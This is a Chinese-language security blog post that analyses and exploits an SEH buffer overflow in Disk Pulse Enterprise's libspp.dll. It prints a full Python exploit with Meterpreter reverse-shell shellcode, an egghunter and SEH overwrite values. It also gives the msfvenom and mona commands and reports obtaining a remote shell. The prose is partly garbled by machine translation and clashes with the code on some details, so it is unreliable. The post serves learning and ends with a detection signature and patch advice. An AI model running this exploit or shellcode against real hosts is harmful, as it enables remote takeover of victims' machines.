## 前言

 **本人刚入行不久，二进制方面也是刚刚入门，目前有了一些学习成果，希望和大家分享一下，能帮助到这方面感兴趣的朋友，如有不足，还请见谅。**

## 一、漏洞简介

Disk Pulse
Eneterprise是一款监视磁盘变化的软件，它可以通过一个管理端口9120或者web管理窗口80对软件进行连接管理，从而监视磁盘的变化情况。在Disk
Pulse Eneterprise中有一个动态链接库libspp.dll
，其中有一些负责HTTP操作的函数，问题就出现在这个动态链接库中，在处理后数据时，由于对于后数据没有进行严格的长度控制，导致在执行获取后数据时向无效内存拷贝数据造成缓冲区溢出，触发SEH异常行为处理，最后控制EIP，执行任意代码。

> 软件下载链接：<https://[www.exploit-> db.com/apps/a679e77e57bf178b22bff5e86409a451-diskpulseent_setup_v9.0.34.exe](http://www.exploit-> db.com/apps/a679e77e57bf178b22bff5e86409a451-diskpulseent_setup_v9.0.34.exe>)
>
> 漏洞披露地址：<https://[www.exploit-db.com/exploits/40452](http://www.exploit-> db.com/exploits/40452>)

## 二、实验环境

> windows 7 x86：系统环境
>
> IDA pro：静态分析工具
>
> 免疫调试器：漏洞分析专用调试器
>
> WinDbg的：漏洞调试器

## 三、漏洞分析

先简单看一下POC，是一个比较综合的缓冲区溢出漏洞。其中涉及了SEH结构化异常处理程序，以及egghunter技术。

### SEH概述

结构化异常处理（SEH）是一种用于处理硬件和软件异常的窗口机制，熟悉编程的人可能熟悉异常处理结构。它通常表示为尝试/除和的try / catch代码块。

### Egghunter概述

简单来说就是一种寻址技术，通过设计标记，然后去跳转到另一个标记所在的位置，执行的shellcode。当缓冲区太小不能放下我们的shellcode的存放，这时就需要egghunter技术。

首先，我们先分析一下POC

    
    
    #!/usr/bin/python
    import socket
    import sys
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect(('192.168.46.160',80))
    
    #msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.46.171 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
    buf =  ""
    buf += "\xdb\xdf\xd9\x74\x24\xf4\xba\x92\xa7\xae\xd7\x5b\x29"
    buf += "\xc9\xb1\x56\x31\x53\x18\x83\xc3\x04\x03\x53\x86\x45"
    buf += "\x5b\x2b\x4e\x0b\xa4\xd4\x8e\x6c\x2c\x31\xbf\xac\x4a"
    buf += "\x31\xef\x1c\x18\x17\x03\xd6\x4c\x8c\x90\x9a\x58\xa3"
    buf += "\x11\x10\xbf\x8a\xa2\x09\x83\x8d\x20\x50\xd0\x6d\x19"
    buf += "\x9b\x25\x6f\x5e\xc6\xc4\x3d\x37\x8c\x7b\xd2\x3c\xd8"
    buf += "\x47\x59\x0e\xcc\xcf\xbe\xc6\xef\xfe\x10\x5d\xb6\x20"
    buf += "\x92\xb2\xc2\x68\x8c\xd7\xef\x23\x27\x23\x9b\xb5\xe1"
    buf += "\x7a\x64\x19\xcc\xb3\x97\x63\x08\x73\x48\x16\x60\x80"
    buf += "\xf5\x21\xb7\xfb\x21\xa7\x2c\x5b\xa1\x1f\x89\x5a\x66"
    buf += "\xf9\x5a\x50\xc3\x8d\x05\x74\xd2\x42\x3e\x80\x5f\x65"
    buf += "\x91\x01\x1b\x42\x35\x4a\xff\xeb\x6c\x36\xae\x14\x6e"
    buf += "\x99\x0f\xb1\xe4\x37\x5b\xc8\xa6\x5f\xa8\xe1\x58\x9f"
    buf += "\xa6\x72\x2a\xad\x69\x29\xa4\x9d\xe2\xf7\x33\x94\xe5"
    buf += "\x07\xeb\x1e\x65\xf6\x0c\x5e\xaf\x3d\x58\x0e\xc7\x94"
    buf += "\xe1\xc5\x17\x18\x34\x73\x12\x8e\x77\x2b\x0c\xe5\x10"
    buf += "\x29\x51\xe8\xbc\xa4\xb7\x5a\x6d\xe6\x67\x1b\xdd\x46"
    buf += "\xd8\xf3\x37\x49\x07\xe3\x37\x80\x20\x8e\xd7\x7c\x18"
    buf += "\x27\x41\x25\xd2\xd6\x8e\xf0\x9e\xd9\x05\xf0\x5f\x97"
    buf += "\xed\x71\x4c\xc0\x89\x79\x8c\x11\x3c\x79\xe6\x15\x96"
    buf += "\x2e\x9e\x17\xcf\x18\x01\xe7\x3a\x1b\x46\x17\xbb\x2d"
    buf += "\x3c\x2e\x29\x11\x2a\x4f\xbd\x91\xaa\x19\xd7\x91\xc2"
    buf += "\xfd\x83\xc2\xf7\x01\x1e\x77\xa4\x97\xa1\x21\x18\x3f"
    buf += "\xca\xcf\x47\x77\x55\x30\xa2\x0b\x92\xce\x30\x24\x3b"
    buf += "\xa6\xca\x74\xbb\x36\xa1\x74\xeb\x5e\x3e\x5a\x04\xae"
    buf += "\xbf\x71\x4d\xa6\x4a\x14\x3f\x57\x4a\x3d\xe1\xc9\x4b"
    buf += "\xb2\x3a\xfa\x36\xbb\xbd\xfb\xc6\xd5\xd9\xfc\xc6\xd9"
    buf += "\xdf\xc1\x10\xe0\x95\x04\xa1\x57\xa5\x33\x84\xfe\x2c"
    buf += "\x3b\x9a\x01\x65"
    
    #pop pop ret 1001A333
    
    nseh = "\xEB\x0B\x90\x90"
    seh = "\x33\xA3\x01\x10"
    
    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    
    evil =  "POST /admin  HTTP/1.1\r\n"
    evil += "Host: 192.168.46.160\r\n"
    evil += "User-Agent: Mozilla/5.0\r\n"
    evil += "Connection: close\r\n"
    evil += "Accept: textml,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    evil += "Accept-Language: en-us,en;q=0.5\r\n"
    evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
    evil += "Keep-Alive: 300\r\n"
    evil += "Proxy-Connection: keep-alive\r\n"
    evil += "Content-Type: application/x-www-form-urlencoded\r\n"
    evil += "Content-Length: 21000\r\n\r\n"
    evil += "\x41" * 12292 #subtract/add for payload
    evil += "w00tw00t"
    evil += "\x90" * 20
    evil += buf
    evil += "\x90" * 50
    evil += "\x42" * 1554
    evil += nseh
    evil += seh
    evil += "\x90" * 20
    evil += egghunter
    evil += "\x90" * 7000
    
    print 'Sending evil buffer...'
    s.send(evil)
    print 'Payload Sent!'
    s.close()
    

攻击者构建了http请求包，可以看出post请求，url是/ login，content-length：17000。发送了12292个“\
x41”字节，然后发送了“w00tw00t”8个字节，之后发送了20个 “\ X90” NOP字节，之后发送的buf，再加50个NOP，1614个 “\
X42”，接下来就是SEH的异常处理机制（不太懂的同学可以去深入了解一下），接下来是egghunter执行代码，大概意思就是去跳转到含有双重 “w00t”
的地方执行。剩下就是对缓冲区的填充。

接下来我们使用文DBG打开带有漏洞版本的应用程序。

![1.png](https://image.3001.net/images/20190809/1565335829_5d4d21157103d.png!small)

发送有效载荷，触发漏洞。输入克，返回地址被覆盖，KB查看堆栈调用。

![2.png](https://image.3001.net/images/20190809/1565335863_5d4d2137ae163.png!small)

这里调用了libspp.dll的SCA_HttpParser的GetNextString函数，接下来程序进入SHE异常行为处理，通过覆盖SEH
Handler打到代码执行。

打开IDA，分析10092822处，在libspp中SCA_HttpParse类负责处理HTTP的一些相关操作，其中有一个函数名为ExtractPostData负责处理后数据，在这个函数入口下断点。这个函数的入口地址为10092510

![3.png](https://image.3001.net/images/20190809/1565335880_5d4d214817179.png!small)

发送缓冲区全用一个代替的POC，触发漏洞，如下图所示：

![4.png](https://image.3001.net/images/20190809/1565335887_5d4d214fb4c65.png!small)

查看传参情况，后期数据作为第二个参数传入，注意是完整传入。![5.png](https://image.3001.net/images/20190809/1565335936_5d4d218068aed.png!small)

这里继续单步跟踪，到达之前说到的GetNetString函数。

![6.png](https://image.3001.net/images/20190809/1565336011_5d4d21cb2ba4a.png!small)

这个函数会做一件事情，就是将第一个参数，也就是后期数据进行拆分，将每一部分分离出来作为后续处理，单步步过，可以看到第一次进入GetNextString之后，拆分了第一个数据。

![7.png](https://image.3001.net/images/20190809/1565336044_5d4d21ec11654.png!small)

第一次分离出来了用户名，接下来，再次进入GetNextString开始拆分第二个字符串，这个拆分过程会执行一系列的拷贝操作。

![8.png](https://image.3001.net/images/20190809/1565336086_5d4d221610295.png!small)

这个LOC块负责拷贝，其中10092822地址就是触发漏洞的关键位置，ESI是待拷贝的缓冲区首地址，EDX是拷贝长度，CL是拷贝内容，这里是一个字一个字拷贝的。

因此，当超过开辟缓冲区大小的时候，就会引发向无效地址拷贝的问题。

![9.png](https://image.3001.net/images/20190809/1565336116_5d4d2234ed95e.png!small)

看一下EDX + ESI的值，可以看到，后面已经超过了开辟缓冲区的大小，后面就是无效缓冲区了。

之后看一下ECX的值

![10.png](https://image.3001.net/images/20190809/1565336158_5d4d225ec2c0a.png!small)CL就是将ECX的低地址一个字节一个字节拷贝，这里由于向无效地址拷贝，引发SEH异常处理，最后达到代码执行，来看一下伪代码。

![11.png](https://image.3001.net/images/20190809/1565336194_5d4d2282e67ae.png!small)再来看一下GetNextString函数的伪代码。

![12.png](https://image.3001.net/images/20190809/1565336380_5d4d233c90fec.png!small)

## 四、漏洞利用

首先发送po​​c，触发漏洞，使用免疫调试器，查看她链，被成功覆盖。

![13.png](https://image.3001.net/images/20190809/1565336387_5d4d2343d655d.png!small)

我们需要找到SHE的偏移量。

利用蒙娜丽莎命令生成20000个字符

    
    
    ！mona pattern_create 20000

运行完在C：\日志\ FTPServer的\ pattern.txt中找到。

![14.png](https://image.3001.net/images/20190809/1565336427_5d4d236be51ff.png!small)

重启程序，将其加入到脚本中的BUF中运行

使用蒙娜丽莎命令来寻找SEH偏移量

    
    
    ！mona findmsp

查看蒙娜丽莎的控制台输出，找到它的描述SHE偏移量的部分。

![15.png](https://image.3001.net/images/20190809/1565336464_5d4d239091f58.png!small)

偏移量是14292。

接下来，要寻找pop pop ret的地址

使用！mona seh

打开seh.txt日志查找指向POP POP RET序列的代码块地址。

![16.png](https://image.3001.net/images/20190809/1565336510_5d4d23be96ff0.png!small)

设置的shellcode里面的

    
    
    nseh =“\ xEB \ x0B \ x90 \ x90”
    
    seh =“\ x33 \ xA3 \ x01 \ x10”

利用msf生成通用的shellcode，命令如下

    
    
    msfvenom -a x86 --platform Windows -pwindows / meterpreter / reverse_tcp LHOST = 192.168.46.171 LPORT = 4444 -ex86 / shikata_ga_nai -b'\ x00 \ x0a \ x0d \ x26'-f python -smallest

![17.png](https://image.3001.net/images/20190809/1565336702_5d4d247e24c62.png!small)

在POC中写入的shellcode，再写入过程中，要根据BUF的长度，修改后面偏移量的值。

![18.png](https://image.3001.net/images/20190809/1565336736_5d4d24a05cca5.png!small)

重启程序，打开的Metasploit

选择开发模式

输入命令，设置参数

![19.png](https://image.3001.net/images/20190809/1565336765_5d4d24bda41bb.png!small)发送poc，触发漏洞，查看metasploit反应，输入shell，可以连到到存在漏洞主机的shell。

![20.png](https://image.3001.net/images/20190809/1565336801_5d4d24e14fa8c.png!small)

## 五、漏洞利用特征：

> 请求方式：POST
>
> 请求路径：/登录
>
> 漏洞特征：POST +任意路径+内容长度：> 14292+ | eb | +任意字节+ | 90 90 |

## 六、防御建议

升级应用程序，对应用程序打补丁或者下载新版本的应用程序，或者装载杀毒软件。

下载地址：<https://www.diskpulse.com/downloads.html>

## 七、总结

享受分析的过程，享受成功的喜悦感，本人刚入行不久，水平不足之处请多多包含。

 ***本文作者：freebuf111，转载请注明来自FreeBuf.COM**

